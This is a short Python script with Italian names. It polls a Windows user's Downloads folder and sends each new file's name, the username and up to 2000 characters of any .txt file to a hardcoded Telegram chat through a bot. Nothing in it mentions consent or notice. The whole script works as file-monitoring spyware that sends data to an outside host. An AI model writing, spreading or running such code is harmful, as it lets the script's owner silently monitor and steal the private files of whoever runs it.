import os
import asyncio
from telegram import Bot

TOKEN = "IL_TUO_TOKEN"
CHAT_ID = 5114048473

bot = Bot(token=TOKEN)

async def invia(messaggio):
    await bot.send_message(chat_id=CHAT_ID, text=messaggio)

def leggi_contenuto(file_path):
    try:
        if file_path.lower().endswith(".txt"):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read(2000)
    except:
        pass
    return "⛔ Contenuto non leggibile"

async def monitora_downloads():
    utente = os.environ.get("USERNAME", "sconosciuto")
    downloads = os.path.join(os.environ["USERPROFILE"], "Downloads")

    visti = set(os.listdir(downloads))

    while True:
        attuali = set(os.listdir(downloads))
        nuovi = attuali - visti

        for file in nuovi:
            percorso = os.path.join(downloads, file)
            contenuto = leggi_contenuto(percorso)

            messaggio = (
                f"📥 Nuovo file in Downloads\n"
                f"👤 Utente: {utente}\n\n"
                f"📄 File: {file}\n\n"
                f"📝 Contenuto:\n{contenuto}"
            )

            await invia(messaggio)

        visti = attuali
        await asyncio.sleep(5)

asyncio.run(monitora_downloads())
